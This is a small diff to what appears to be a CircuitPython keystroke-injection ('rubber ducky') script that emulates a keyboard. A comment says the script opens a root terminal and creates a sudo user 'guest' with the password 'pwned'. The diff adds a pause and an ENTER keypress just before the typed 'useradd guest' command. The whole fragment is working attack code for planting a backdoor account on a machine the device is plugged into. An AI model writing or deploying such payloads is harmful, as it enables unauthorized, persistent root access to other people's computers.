@@ -50,6 +50,8 @@ time.sleep(0.5)
 kbd.send(Keycode.F10)
 # HERE for enter root terminal and in the below code create sudo user call guest and guest's password is pwned
 time.sleep(20)
+time.sleep(0.05)
+kbd.send(Keycode.ENTER)
 layout.write("useradd guest")
 time.sleep(0.05)
 kbd.send(Keycode.ENTER)
